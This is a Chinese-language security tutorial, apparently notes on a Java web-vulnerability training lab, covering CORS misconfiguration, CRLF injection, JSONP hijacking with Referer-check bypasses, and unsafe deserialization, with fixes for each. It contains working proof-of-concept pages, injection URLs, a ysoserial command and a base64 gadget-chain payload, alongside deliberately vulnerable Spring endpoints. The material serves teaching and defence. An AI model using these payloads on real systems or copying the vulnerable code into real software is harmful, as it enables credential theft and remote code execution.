<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line"> &lt;title&gt;CORS TEST&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"> &lt;div id&#x3D;&#39;output&#39;&gt;&lt;&#x2F;div&gt;</span><br><span class="line"> &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">   var req &#x3D; new XMLHttpRequest(); </span><br><span class="line">   req.onload &#x3D; reqListener; </span><br><span class="line">   req.open(&#39;get&#39;,&#39;http:&#x2F;&#x2F;vuln.com&#x2F;xxxx&#39;,true);</span><br><span class="line">   &#x2F;&#x2F;req.setRequestHeader(&quot;Content-Type&quot;,&quot;application&#x2F;x-www-form-urlencoded;&quot;); </span><br><span class="line">   req.withCredentials &#x3D; true;</span><br><span class="line">   req.send();</span><br><span class="line">   function reqListener() &#123;</span><br><span class="line">    var output &#x3D; document.getElementById(&#39;output&#39;);</span><br><span class="line">    output.innerHTML &#x3D; &quot;URL: http:&#x2F;&#x2F;vuln.com&#x2F;xxxx&lt;br&gt;&lt;br&gt;Response:&lt;br&gt;&lt;textarea style&#x3D;&#39;width: 659px; height: 193px;&#39;&gt;&quot; + req.responseText + &quot;&lt;&#x2F;textarea&gt;&quot;;</span><br><span class="line">   &#125;;</span><br><span class="line"> &lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>



<p>POST：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;CORS TEST&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div id&#x3D;&#39;output&#39;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">    &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">            var req &#x3D; new XMLHttpRequest();</span><br><span class="line">            var data &#x3D; &quot;userId%3Dadmin&quot;;</span><br><span class="line">            req.onload &#x3D; reqListener;</span><br><span class="line">            req.open(&#39;post&#39;,&#39;http:&#x2F;&#x2F;vuln.com&#x2F;xxxx&#39;,true);</span><br><span class="line">            req.setRequestHeader(&quot;Content-Type&quot;,&quot;xxx&quot;);</span><br><span class="line">            req.withCredentials &#x3D; true;</span><br><span class="line">            req.send(data);</span><br><span class="line">            function reqListener() &#123;</span><br><span class="line">                var output &#x3D; document.getElementById(&#39;output&#39;);</span><br><span class="line">                output.innerHTML &#x3D; &quot;URL: http:&#x2F;&#x2F;vuln.com&#x2F;xxxx&lt;br&gt;Data: userId%3Dadmin&lt;br&gt;&lt;br&gt;Response:&lt;br&gt;&lt;textarea style&#x3D;&#39;width: 659px; height: 193px;&#39;&gt;&quot; + req.responseText + &quot;&lt;&#x2F;textarea&gt;&quot;;</span><br><span class="line">            &#125;;</span><br><span class="line">    &lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>核心代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private static String info &#x3D; &quot;&#123;\&quot;name\&quot;: \&quot;JoyChou\&quot;, \&quot;phone\&quot;: \&quot;18200001111\&quot;&#125;&quot;;</span><br><span class="line"></span><br><span class="line">@GetMapping(&quot;&#x2F;vuln&#x2F;origin&quot;)</span><br><span class="line">public String vuls1(HttpServletRequest request, HttpServletResponse response) &#123;</span><br><span class="line">    String origin &#x3D; request.getHeader(&quot;origin&quot;);</span><br><span class="line">    response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin); &#x2F;&#x2F; set origin from header</span><br><span class="line">    response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);  &#x2F;&#x2F; allow cookie</span><br><span class="line">    return info;</span><br><span class="line">&#125;</span><br><span class="line">@GetMapping(&quot;&#x2F;vuln&#x2F;setHeader&quot;)</span><br><span class="line">public String vuls2(HttpServletResponse response) &#123;</span><br><span class="line">    &#x2F;&#x2F; 后端设置Access-Control-Allow-Origin为*的情况下，跨域的时候前端如果设置withCredentials为true会异常</span><br><span class="line">    response.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;);</span><br><span class="line">    return info;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>设置HTTP头，然后直接返回信息</p>
<p>修复方式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line">     * 重写Cors的checkOrigin校验方法</span><br><span class="line">     * 支持自定义checkOrigin，让其额外支持一级域名</span><br><span class="line">     * 代码：org&#x2F;joychou&#x2F;security&#x2F;CustomCorsProcessor</span><br><span class="line">     *&#x2F;</span><br><span class="line">    @CrossOrigin(origins &#x3D; &#123;&quot;joychou.org&quot;, &quot;http:&#x2F;&#x2F;test.joychou.me&quot;&#125;)</span><br><span class="line">    @GetMapping(&quot;&#x2F;sec&#x2F;crossOrigin&quot;)</span><br><span class="line">    public String secCrossOrigin() &#123;</span><br><span class="line">        return info;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * WebMvcConfigurer设置Cors</span><br><span class="line">     * 支持自定义checkOrigin</span><br><span class="line">     * 代码：org&#x2F;joychou&#x2F;config&#x2F;CorsConfig.java</span><br><span class="line">     *&#x2F;</span><br><span class="line">    @GetMapping(&quot;&#x2F;sec&#x2F;webMvcConfigurer&quot;)</span><br><span class="line">    public CsrfToken getCsrfToken_01(CsrfToken token) &#123;</span><br><span class="line">        return token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * spring security设置cors</span><br><span class="line">     * 不支持自定义checkOrigin，因为spring security优先于setCorsProcessor执行</span><br><span class="line">     * 代码：org&#x2F;joychou&#x2F;security&#x2F;WebSecurityConfig.java</span><br><span class="line">     *&#x2F;</span><br><span class="line">    @GetMapping(&quot;&#x2F;sec&#x2F;httpCors&quot;)</span><br><span class="line">    public CsrfToken getCsrfToken_02(CsrfToken token) &#123;</span><br><span class="line">        return token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 自定义filter设置cors</span><br><span class="line">     * 支持自定义checkOrigin</span><br><span class="line">     * 代码：org&#x2F;joychou&#x2F;filter&#x2F;OriginFilter.java</span><br><span class="line">     *&#x2F;</span><br><span class="line">    @GetMapping(&quot;&#x2F;sec&#x2F;originFilter&quot;)</span><br><span class="line">    public CsrfToken getCsrfToken_03(CsrfToken token) &#123;</span><br><span class="line">        return token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * CorsFilter设置cors。</span><br><span class="line">     * 不支持自定义checkOrigin，因为corsFilter优先于setCorsProcessor执行</span><br><span class="line">     * 代码：org&#x2F;joychou&#x2F;filter&#x2F;BaseCorsFilter.java</span><br><span class="line">     *&#x2F;</span><br><span class="line">    @RequestMapping(&quot;&#x2F;sec&#x2F;corsFilter&quot;)</span><br><span class="line">    public CsrfToken getCsrfToken_04(CsrfToken token) &#123;</span><br><span class="line">        return token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @GetMapping(&quot;&#x2F;sec&#x2F;checkOrigin&quot;)</span><br><span class="line">    public String seccode(HttpServletRequest request, HttpServletResponse response) &#123;</span><br><span class="line">        String origin &#x3D; request.getHeader(&quot;Origin&quot;);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 如果origin不为空并且origin不在白名单内，认定为不安全。</span><br><span class="line">        &#x2F;&#x2F; 如果origin为空，表示是同域过来的请求或者浏览器直接发起的请求。</span><br><span class="line">        if (origin !&#x3D; null &amp;&amp; SecurityUtil.checkURL(origin) &#x3D;&#x3D; null) &#123;</span><br><span class="line">            return &quot;Origin is not safe.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin);</span><br><span class="line">        response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);</span><br><span class="line">        return LoginUtils.getUserInfo2JsonStr(request);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a href="https://www.mi1k7ea.com/2019/08/18/CORS%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#CORS%E4%B8%8ECSRF%E7%9A%84%E5%8C%BA%E5%88%AB">Cors和CSRF的区别</a></p>
<h2 id="5-CRLFInjection"><a href="#5-CRLFInjection" class="headerlink" title="5.CRLFInjection"></a>5.CRLFInjection</h2><p>​    RLF是”回车+换行”(\r\n)(编码后是%0D%0A)的简称,在HTTP中,HTTP Header和HTTP Body是用两个CRLF来分割的。浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。CRLF漏洞可以造成Cookie会话固定和反射型XSS(可过waf)的危害，注入XSS的利用方式：连续使用两次%0d%oa就会造成header和body之间的分离，就可以在其中插入xss代码形成反射型xss漏洞。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?url&#x3D;http:&#x2F;&#x2F;baidu.com&#x2F;xxx%0a%0dSet-Cookie: test123&#x3D;123  &#x2F;&#x2F; 恶意添加修改信息</span><br></pre></td></tr></table></figure>

<p>​    关于实战，这里有几个案例，可以学习一波。</p>
<ol>
<li><a href="https://www.v0n.top/2020/01/29/CRLF注入/">CRLF注入</a></li>
<li><a href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html">Bottle HTTP 头注入漏洞探究</a></li>
<li><a href="https://www.cnblogs.com/tr1ple/p/6648767.html">案例</a></li>
</ol>
<p>但这个问题实际上已经在所有的现在的java EE应用服务器上修复了。如果你想关注这个漏洞，你应该在目标平台测试是否允许将CRLF插入到HTTP头中。不出意外的话，这个漏洞已经在大部分的目前的应用服务器上修复了，无论是用什么语言编写的。</p>
<p>核心代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;crlf&quot;)</span><br><span class="line">public class CRLFInjection &#123;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(&quot;&#x2F;safecode&quot;)</span><br><span class="line">    @ResponseBody</span><br><span class="line">    public void crlf(HttpServletRequest request, HttpServletResponse response) &#123;</span><br><span class="line">        response.addHeader(&quot;test1&quot;, request.getParameter(&quot;test1&quot;));</span><br><span class="line">        response.setHeader(&quot;test2&quot;, request.getParameter(&quot;test2&quot;));</span><br><span class="line">        String author &#x3D; request.getParameter(&quot;test3&quot;);</span><br><span class="line">        Cookie cookie &#x3D; new Cookie(&quot;test3&quot;, author);</span><br><span class="line">        response.addCookie(cookie);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>访问<a href="http://localhost:8080/java_sec_code_war/crlf/safecode">http://localhost:8080/java_sec_code_war/crlf/safecode</a></p>
<p>?test1=111%0d%0ax&amp;test2=111%0d%0a111</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210909095847712.png" alt="image-20210909095847712"></p>
<h2 id="6-Jsonp"><a href="#6-Jsonp" class="headerlink" title="6.Jsonp"></a>6.Jsonp</h2><p>JSONP是实现跨域的一种技术，应用于Web站点需要跨域获取数据的场景。当开发者使用不当时，攻击者可以恶意利用jsonp劫持数据。</p>
<p>举例说明如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在 jQuery 中，可以通过使用JSONP 形式的回调函数来加载其他网域的JSON数据，如 &quot;myurl?callback&#x3D;?&quot;。jQuery 将自动替换 ? 为正确的函数名，以执行回调函数。 </span><br><span class="line">jQuery 会把？注册成window.? 的系统函数，然后映射调用。</span><br><span class="line">一般用于跨域ajax请求，提供URL的一方会返回一个callback函数的JSON数据，然后回调时就能获取了。</span><br><span class="line"> </span><br><span class="line">请求的URL例子：</span><br><span class="line">&quot;myurl?callback&#x3D;123123123&quot; &#x2F;&#x2F;这个123123就是?号，jquery自动生成的。</span><br><span class="line">返回的数据例子：</span><br><span class="line">123123123(&#123;“id”:&quot;1&quot;,&quot;name&quot;:&quot;张三&quot;&#125;)</span><br></pre></td></tr></table></figure>

<p>核心代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@ControllerAdvice</span><br><span class="line">public class JSONPAdvice extends AbstractJsonpResponseBodyAdvice &#123;</span><br><span class="line"></span><br><span class="line">    public JSONPAdvice() &#123;</span><br><span class="line">        super(&quot;callback&quot;, &quot;cback&quot;); &#x2F;&#x2F; callback的参数名，可以为多个</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当有接口返回了Object(比如JSONObject或者JavaBean，但是不支持String)，只要在参数中加入<code>callback=test</code>或<code>cback=test</code>就会自动变成JSONP接口。比如下面代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(value &#x3D; &quot;&#x2F;advice&quot;, produces &#x3D; MediaType.APPLICATION_JSON_VALUE)</span><br><span class="line">public JSONObject advice() &#123;</span><br><span class="line">    String info &#x3D; &quot;&#123;\&quot;name\&quot;: \&quot;JoyChou\&quot;, \&quot;phone\&quot;: \&quot;18200001111\&quot;&#125;&quot;;</span><br><span class="line">    return JSON.parseObject(info);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>虽然上面代码指定了response的<code>content-type</code>为<code>application/json</code>，但是在<code>AbstractJsonpResponseBodyAdvice</code>类中会设置为<code>application/javascript</code>，提供给前端调用。</p>
<p>设置<code>content-type</code>为<code>application/javascript</code>的代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">protected MediaType getContentType(MediaType contentType, ServerHttpRequest request, ServerHttpResponse response) &#123;</span><br><span class="line">	return new MediaType(&quot;application&quot;, &quot;javascript&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>并且还会判断callback的参数只是否是有效的，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private static final Pattern CALLBACK_PARAM_PATTERN &#x3D; Pattern.compile(&quot;[0-9A-Za-z_\\.]*&quot;);</span><br><span class="line"></span><br><span class="line">protected boolean isValidJsonpQueryParam(String value) &#123;</span><br><span class="line">	return CALLBACK_PARAM_PATTERN.matcher(value).matches();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="安全问题："><a href="#安全问题：" class="headerlink" title="安全问题："></a>安全问题：</h3><blockquote>
<p>使用<code>AbstractJsonpResponseBodyAdvice</code>能避免callback导致的XSS问题，但是会带来一个新的风险：可能有的JSON接口强行被设置为了JSONP，导致JSON劫持。所以使用<code>AbstractJsonpResponseBodyAdvice</code>，需要默认校验所有jsonp接口的referer是否合法。</p>
</blockquote>
<p>PS：</p>
<p>在Spring Framework 5.1，移除了<code>AbstractJsonpResponseBodyAdvice</code>类。Springboot <code>2.1.0 RELEASE</code>默认使用spring framework版本5.1.2版本。也就是在SpringBoot <code>2.1.0 RELEASE</code>及以后版本都不能使用该功能，用CORS替代。</p>
<p><a href="https://docs.spring.io/spring/docs/5.0.x/javadoc-api/org/springframework/web/servlet/mvc/method/annotation/AbstractJsonpResponseBodyAdvice.html">https://docs.spring.io/spring/docs/5.0.x/javadoc-api/org/springframework/web/servlet/mvc/method/annotation/AbstractJsonpResponseBodyAdvice.html</a></p>
<blockquote>
<p>Will be removed as of Spring Framework 5.1, use CORS instead.</p>
</blockquote>
<h3 id="1-前端调用代码的"><a href="#1-前端调用代码的" class="headerlink" title="1.前端调用代码的"></a>1.前端调用代码的</h3><ul>
<li>使用ajax的jsonp调用方式，运行后会弹框<code>JoyChou</code>。</li>
<li>使用script src方式，运行后会弹框<code>JoyChou</code>。</li>
</ul>
<p>使用ajax的jsonp调用方式代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;UTF-8&quot; &#x2F;&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.bootcss.com&#x2F;jquery&#x2F;3.4.1&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script language&#x3D;&quot;JavaScript&quot;&gt;</span><br><span class="line">$(document).ready(function() &#123;</span><br><span class="line">	$.ajax(&#123;</span><br><span class="line">		url:&#39;http:&#x2F;&#x2F;localhost:8080&#x2F;jsonp&#x2F;advice&#39;,</span><br><span class="line">		dataType:&#39;jsonp&#39;,</span><br><span class="line">		success:function(data)&#123;</span><br><span class="line">			alert(data.name)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>script src方式代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">	function aaa(data)&#123;</span><br><span class="line">		alert(JSON.stringify(data));</span><br><span class="line">	&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;http:&#x2F;&#x2F;172.20.10.6:8080&#x2F;java_sec_code_war&#x2F;jsonp&#x2F;vuln&#x2F;referer?callback_&#x3D;aaa&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>script src方法 测试如下：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210909105509839.png" alt="image-20210909105509839"></p>
<h3 id="2-空Referer绕过"><a href="#2-空Referer绕过" class="headerlink" title="2.空Referer绕过"></a>2.空Referer绕过</h3><p>有时候开发同学为了测试方便，JSONP接口能直接访问，不直接访问做了Referer限制。正常来讲，前端发起的请求默认都会带着Referer，所以简单说下如何绕过空Referer。</p>
<p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(value &#x3D; &quot;&#x2F;vuln&#x2F;emptyReferer&quot;, produces &#x3D; &quot;application&#x2F;javascript&quot;)</span><br><span class="line">public String emptyReferer(HttpServletRequest request) &#123;</span><br><span class="line">    String referer &#x3D; request.getHeader(&quot;referer&quot;);</span><br><span class="line"></span><br><span class="line">    if (null !&#x3D; referer &amp;&amp; SecurityUtil.checkURL(referer) &#x3D;&#x3D; null) &#123;</span><br><span class="line">        return &quot;error&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    String callback &#x3D; request.getParameter(this.callback);</span><br><span class="line">    return WebUtils.json2Jsonp(callback, LoginUtils.getUserInfo2JsonStr(request));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>增加了对referer的检测我们可以使用如下方法进行绕过</p>
<h4 id="1-添加no-referrer-参数"><a href="#1-添加no-referrer-参数" class="headerlink" title="1.添加no-referrer 参数"></a>1.添加no-referrer 参数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta name&#x3D;&quot;referrer&quot; content&#x3D;&quot;no-referrer&quot; &#x2F;&gt;      &#x2F;&#x2F;no-referrer</span><br><span class="line">&lt;script&gt;</span><br><span class="line">	function test(data)&#123;</span><br><span class="line">		alert(JSON.stringify(data));</span><br><span class="line">	&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;http:&#x2F;&#x2F;172.20.10.6:8080&#x2F;java_sec_code_war&#x2F;jsonp&#x2F;vuln&#x2F;emptyReferer?callback_&#x3D;test&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<h4 id="2-使用iframe标签进行绕过"><a href="#2-使用iframe标签进行绕过" class="headerlink" title="2.使用iframe标签进行绕过"></a>2.使用iframe标签进行绕过</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta name&#x3D;&quot;referrer&quot; content&#x3D;&quot;no-referrer&quot; &#x2F;&gt;</span><br><span class="line">&lt;iframe src&#x3D;&quot;javascript:&#39;&lt;script&gt;function test(data)&#123;alert(JSON.stringify(data));&#125;&lt;&#x2F;script&gt;&lt;script src&#x3D;http:&#x2F;&#x2F;172.20.10.6:8080&#x2F;java_sec_code_war&#x2F;jsonp&#x2F;vuln&#x2F;emptyReferer?callback_&#x3D;test&gt;&lt;&#x2F;script&gt;&#39;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>测试如下：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210909111157468.png" alt="image-20210909111157468"></p>
<p>修复代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(value &#x3D; &quot;&#x2F;sec&#x2F;checkReferer&quot;, produces &#x3D; &quot;application&#x2F;javascript&quot;)</span><br><span class="line">public String safecode(HttpServletRequest request) &#123;</span><br><span class="line">    String referer &#x3D; request.getHeader(&quot;referer&quot;);</span><br><span class="line"></span><br><span class="line">    if (SecurityUtil.checkURL(referer) &#x3D;&#x3D; null) &#123;</span><br><span class="line">        return &quot;error&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    String callback &#x3D; request.getParameter(this.callback);</span><br><span class="line">    return WebUtils.json2Jsonp(callback, LoginUtils.getUserInfo2JsonStr(request));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不管referer是否为null都进行判断</p>
<h3 id="3-fastjsonp-to-jsonp"><a href="#3-fastjsonp-to-jsonp" class="headerlink" title="3.fastjsonp to jsonp"></a>3.fastjsonp to jsonp</h3><p>核心代码如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(value &#x3D; &quot;&#x2F;fastjsonp&#x2F;getToken&quot;, produces &#x3D; &quot;application&#x2F;javascript&quot;)</span><br><span class="line">public String getCsrfToken2(HttpServletRequest request) &#123;</span><br><span class="line">    CsrfToken csrfToken &#x3D; cookieCsrfTokenRepository.loadToken(request); &#x2F;&#x2F; get csrf token</span><br><span class="line"></span><br><span class="line">    String callback &#x3D; request.getParameter(&quot;fastjsonpCallback&quot;);</span><br><span class="line">    if (StringUtils.isNotBlank(callback)) &#123;</span><br><span class="line">        JSONPObject jsonpObj &#x3D; new JSONPObject(callback);</span><br><span class="line">        jsonpObj.addParameter(csrfToken);</span><br><span class="line">        return jsonpObj.toString();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return csrfToken.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试如下：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210909143444477.png" alt="image-20210909143444477"></p>
<h2 id="7-Deserialize-序列化与反序列化"><a href="#7-Deserialize-序列化与反序列化" class="headerlink" title="7.Deserialize 序列化与反序列化"></a>7.Deserialize 序列化与反序列化</h2><p>​    Java程序使用ObjectInputStream对象的readObject方法将反序列化数据转换为java对象。但当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码。</p>
<p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line">     * java -jar ysoserial.jar CommonsCollections5 &quot;open -a Calculator&quot; | base64</span><br><span class="line">     * Add the result to rememberMe cookie.</span><br><span class="line">     * &lt;p&gt;</span><br><span class="line">     * http:&#x2F;&#x2F;localhost:8080&#x2F;deserialize&#x2F;rememberMe&#x2F;vuln</span><br><span class="line">     *&#x2F;</span><br><span class="line">    @RequestMapping(&quot;&#x2F;rememberMe&#x2F;vuln&quot;)</span><br><span class="line">    public String rememberMeVul(HttpServletRequest request)</span><br><span class="line">            throws IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        Cookie cookie &#x3D; getCookie(request, Constants.REMEMBER_ME_COOKIE);</span><br><span class="line"></span><br><span class="line">        if (null &#x3D;&#x3D; cookie) &#123;</span><br><span class="line">            return &quot;No rememberMe cookie. Right?&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String rememberMe &#x3D; cookie.getValue();</span><br><span class="line">        byte[] decoded &#x3D; Base64.getDecoder().decode(rememberMe);</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream bytes &#x3D; new ByteArrayInputStream(decoded);</span><br><span class="line">        ObjectInputStream in &#x3D; new ObjectInputStream(bytes);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line"></span><br><span class="line">        return &quot;Are u ok?&quot;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>代码相对来说也比较简单使用Java程序中类ObjectInputStream的readObject方法被用来将数据流反序列化为对象，如果流中的对象是class，则它的ObjectStreamClass描述符会被读取，并返回相应的class对象，ObjectStreamClass包含了类的名称及serialVersionUID。</p>
<p>利用方式如下：</p>
<p>使用ysoserial.jar生成payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ java -jar ysoserial.jar CommonsCollections5 &quot;open -a Calculator&quot; | base64</span><br><span class="line">rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAUXQAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0c3EAfgALAAAAM3EAfgANcQB+AA5xAH4AD3NxAH4ACwAAACJ0ABl5c29zZXJpYWwuR2VuZXJhdGVQYXlsb2FkdAAUR2VuZXJhdGVQYXlsb2FkLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0&#x2F;A8lMbXsjhACAAFMAARsaXN0cQB+AAd4cgAsamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AGnhzcgA0b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmtleXZhbHVlLlRpZWRNYXBFbnRyeYqt0ps5wR&#x2F;bAgACTAADa2V5cQB+AAFMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvb